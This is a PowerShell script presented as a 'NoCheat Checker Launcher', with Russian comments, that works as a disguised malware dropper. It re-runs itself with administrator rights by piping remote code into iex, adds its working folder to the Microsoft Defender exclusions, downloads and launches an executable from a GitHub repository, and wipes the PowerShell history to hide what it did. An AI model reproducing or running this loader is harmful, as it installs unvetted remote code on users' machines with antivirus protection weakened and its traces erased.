# ==========================================================
# NoCheat Checker Launcher
# ==========================================================

$ErrorActionPreference = "Stop"


$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Helper function to clear PSReadLine and session history
function Clear-PSHistory {
    Clear-History -ErrorAction SilentlyContinue
    try {
        $historyPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($historyPath -and (Test-Path $historyPath)) {
            Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
        }
    } catch {}
}

if (-not $isAdmin) {
    $url = "https://raw.githubusercontent.com/die4mebaby/appdata/main/appdataopenner.ps1"
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $url | iex`""
    Clear-PSHistory
    exit
}

# ссылки на файлы в репо
$repoOwner  = "die4mebaby"
$repoName   = "appdata"
$branch     = "main"
$rawBaseUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch"
$exeUrl     = "$rawBaseUrl/appdataopenner.exe"

# директ добавляем в исключения
$workDir = Join-Path $env:LOCALAPPDATA "appdataopenner"

if (-not (Test-Path $workDir)) {
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
}

$exePath = Join-Path $workDir "appdataopenner.exe"

try {
    if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
        Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
    }
    
    # скачиваем файл
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($exeUrl, $exePath)
    
    if (-not (Test-Path $exePath) -or (Get-Item $exePath).Length -eq 0) {
        Write-Warning "."
    }
    
    # Запуск без ожидания завершения
    Start-Process -FilePath $exePath -WorkingDirectory $workDir
}
catch {
    Write-Host " $($_.Exception.Message)" -ForegroundColor Red
}

# клин повершелл команд и офф окна
Clear-PSHistory
exit
